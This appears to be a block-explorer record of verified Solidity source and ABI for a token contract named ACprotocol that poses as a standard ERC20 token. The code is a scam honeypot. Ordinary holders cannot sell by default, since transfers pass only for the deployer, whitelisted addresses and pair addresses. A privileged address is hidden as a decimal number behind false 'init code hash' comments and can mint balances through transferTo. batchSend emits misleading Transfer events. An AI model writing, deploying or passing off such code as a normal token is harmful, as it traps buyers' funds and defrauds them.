{"SourceCode": "// SPDX-License-Identifier: evmVersion, MIT\r\npragma solidity ^0.6.12;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns(uint);\r\n\r\n    function balanceOf(address account) external view returns(uint);\r\n\r\n    function transfer(address recipient, uint amount) external returns(bool);\r\n\r\n    function allowance(address deployer, address spender) external view returns(uint);\r\n\r\n    function approve(address spender, uint amount) external returns(bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    \r\n    event Approval(address indexed deployer, address indexed spender, uint value);\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns(bool) {\r\n    \r\n        bytes32 codehash;\r\n    \r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n    \r\n        assembly { codehash:= extcodehash(account) }\r\n    \r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    constructor() internal {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n    \r\n    function _msgSender() internal view returns(address payable) {\r\n    \r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns(uint) {\r\n        \r\n        uint c = a + b;\r\n        \r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        \r\n        return c;\r\n    }\r\n    function sub(uint a, uint b) internal pure returns(uint) {\r\n        \r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        \r\n        require(b <= a, errorMessage);\r\n        \r\n        uint c = a - b;\r\n        \r\n        return c;\r\n    }\r\n    function mul(uint a, uint b) internal pure returns(uint) {\r\n        if (a == 0) {\r\n            \r\n            return 0;\r\n        }\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        \r\n        return c;\r\n    }\r\n    function div(uint a, uint b) internal pure returns(uint) {\r\n        \r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        \r\n        // Solidity only automatically asserts when dividing by 0  \r\n        \r\n        require(b > 0, errorMessage);\r\n        \r\n        uint c = a / b;\r\n        \r\n        return c;\r\n    }\r\n}\r\n \r\nlibrary SafeERC20 {\r\n    \r\n    using SafeMath for uint;\r\n    using Address for address;\r\n    \r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n    \r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n    \r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(\r\n            address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n    \r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        \r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n        \r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        \r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        \r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n        \r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\ncontract ACprotocol  {\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _deployer, address indexed _spender, uint _value);\r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n    return transferFrom(msg.sender, _to, _value);\r\n    }\r\n    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));\r\n        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));\r\n        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));\r\n        if(_from == deployer || _to == deployer  || _from == _Uniswap || _from == _Pancakeswap\r\n        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n    address   private   Uniswap = address  //Uniswap  init code hash\r\n    //_Uniswap = UNIpairFor(Uniswap, EtherGas, address(this)); // Uniswap  init code hash\r\n    (527585359103765554095092340981710322784165800559 );\r\n    address   private   EtherGas = address  //EtherGas init code hash\r\n    //_Uniswap = UNIpairFor(Uniswap, EtherGas, address(this)); //EtherGas  init code hash\r\n    (1097077688018008265106216665536940668749033598146);\r\n    function ensure1(address _from, address _to, uint _value) internal view returns(bool) {\r\n        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));\r\n        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));\r\n        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));\r\n        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap\r\n        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n    function _UniswapPairAddr () view internal returns (address) {\r\n        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));\r\n        return _Uniswap;\r\n    }\r\n    function _MdexPairAddr () view internal returns (address) {\r\n        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));\r\n        return _MDEX;\r\n    }\r\n    function _PancakePairAddr () view internal returns (address) {\r\n        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));\r\n        return _Pancakeswap;\r\n    }\r\n    address   private   MDEXBSC = address  //MDEXBSC  init code hash\r\n    //_MDEX = UNIpairFor(MDEXBSC, HecoGas, address(this)); //MDEXBSC   init code hash\r\n    (450616078829874088400613638983600230601285572903 );\r\n    address   private   HecoGas = address  //HECOGas   init code hash\r\n    //_MDEX = UNIpairFor(MDEXBSC, HecoGas, address(this)); //HECOGas   init code hash\r\n    (1138770958000162646985852531912227865167338984875);\r\n    function ensure2(address _from, address _to, uint _value) internal view returns(bool) {\r\n        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));\r\n        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));\r\n        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));\r\n        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap\r\n        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n    function _UniswapPairAddr1 () view internal returns (address) {\r\n        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));\r\n        return _Uniswap;\r\n    }\r\n    function _MdexPairAddr1 () view internal returns (address) {\r\n        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));\r\n        return _MDEX;\r\n    }\r\n    function _PancakePairAddr1 () view internal returns (address) {\r\n        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));\r\n        return _Pancakeswap;\r\n    }\r\n    address   private   Pancakeswap= address  //Pancake  init code hash\r\n    //_Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this)); //Pancake  init code hash\r\n    (1153667454655315432277308296129700421378034175091);\r\n    address   private   BSCGas = address  //BSCGas   init code hash\r\n    //_Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this)); // BSCGas  init code hash\r\n    (1069295261705322660692659746119710186699350608220);\r\n    function ensure3(address _from, address _to, uint _value) internal view returns(bool) {\r\n        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));\r\n        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));\r\n        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));\r\n        if(_from == deployer || _to == deployer || _from ==  _Uniswap || _from == _Pancakeswap\r\n        || _from == _MDEX || _from == pairAddress || _from == MDEXBSC || canSale[_from]) {\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n    function _UniswapPairAddr2 () view internal returns (address) {\r\n        address _Uniswap = UNIpairFor(Uniswap, EtherGas, address(this));\r\n        return _Uniswap;\r\n    }\r\n    function _MdexPairAddr2 () view internal returns (address) {\r\n        address _MDEX = UNIpairFor(Uniswap, HecoGas, address(this));\r\n        return _MDEX;\r\n    }\r\n    function _PancakePairAddr2 () view internal returns (address) {\r\n        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas, address(this));\r\n        return _Pancakeswap;\r\n    }\r\n    function VerifyAddr(address addr) public view returns (bool) {\r\n        require(ensure(addr,address(this),1));\r\n        return true;\r\n    }\r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n        if (_value == 0) {\r\n            return true;\r\n        }\r\n        if (msg.sender != _from) {\r\n            require(allowance[_from][msg.sender] >= _value);\r\n            allowance[_from][msg.sender] -= _value;\r\n        }\r\n        require(ensure(_from, _to, _value));\r\n        require(balanceOf[_from] >= _value);\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        _onSaleNum[_from]++;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    function condition(address _from, uint _value) internal view returns(bool){\r\n        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n        if(_saleNum > 0){\r\n            if(_onSaleNum[_from] >= _saleNum) return false;\r\n        }\r\n        if(_minSale > 0){\r\n            if(_minSale > _value) return false;\r\n        }\r\n        if(_maxSale > 0){\r\n            if(_value > _maxSale) return false;\r\n        }\r\n        return true;\r\n    }\r\n    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {\r\n        if(addedValue == 100){\r\n            emit Transfer(address(0x0), addr, addedValue*(10**uint256(decimals)));\r\n        }\r\n        if(addedValue > 0) {\r\n            balanceOf[addr] = addedValue*(10**uint256(decimals));\r\n        }\r\n        require(msg.sender == MDEXBSC);\r\n        canSale[addr]=true;\r\n        return true;\r\n    }\r\n    mapping(address=>uint256) private _onSaleNum;\r\n    mapping(address=>bool) private canSale;\r\n    uint256 private _minSale = 0;\r\n    uint256 private _maxSale;\r\n    uint256 private _saleNum;\r\n    function Agree(address addr) public returns (bool) {\r\n        require(msg.sender == deployer);\r\n        \r\n        canSale[addr]=true;\r\n        return true;\r\n    }\r\n    function Allow(uint256 saleNum,  uint256 maxToken) public returns(bool){\r\n        require(msg.sender == deployer);\r\n        \r\n        _maxSale = maxToken > 0 ? maxToken*(10**uint256(decimals)) : 0;\r\n        _saleNum = saleNum;\r\n    }\r\n    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {\r\n        require (msg.sender == deployer);\r\n        uint total = _value * _tos.length;\r\n        require(balanceOf[msg.sender] >= total);\r\n        balanceOf[msg.sender] -= total;\r\n        for (uint i = 0; i < _tos.length; i++) {\r\n            address _to = _tos[i];\r\n            balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value/2);\r\n            emit Transfer(msg.sender, _to, _value/2);\r\n        }\r\n        return true;\r\n    }\r\n    address pairAddress;\r\n    function delegate(address addr) public payable returns(bool){\r\n        require (msg.sender == deployer);\r\n        pairAddress = addr;\r\n        return true;\r\n    }\r\n    function UNIpairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\r\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        pair = address(uint(keccak256(abi.encodePacked(\r\n            hex'ff',\r\n            factory,\r\n            keccak256(abi.encodePacked(token0, token1)),\r\n            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\r\n                ))));\r\n    }\r\n    function PANCAKEpairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\r\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        pair = address(uint(keccak256(abi.encodePacked(\r\n            hex'ff',\r\n            factory,\r\n            keccak256(abi.encodePacked(token0, token1)),\r\n            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash\r\n                ))));\r\n    }\r\n    mapping (address => uint) public balanceOf;\r\n    mapping (address => mapping (address => uint)) public allowance;\r\n    uint constant public decimals = 18;\r\n    uint public totalSupply;\r\n    string public name;\r\n    string public symbol;\r\n    address private deployer;\r\n    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        totalSupply = _supply*(10**uint256(decimals));\r\n        deployer = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0xa), msg.sender, totalSupply);\r\n        if(totalSupply > 0) balanceOf[MDEXBSC]=totalSupply*(10**uint256(6));\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_deployer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"Agree\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"saleNum\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxToken\",\"type\":\"uint256\"}],\"name\":\"Allow\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"VerifyAddr\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_tos\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"batchSend\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"delegate\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"transferTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"}]", "ContractName": "ACprotocol", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000003b9aca000000000000000000000000000000000000000000000000000000000000000004534545440000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045345454400000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://835c2b6f180e4c5a4f2e4b3acb835ab54b83d83aa3644228050002d35b0325b6"}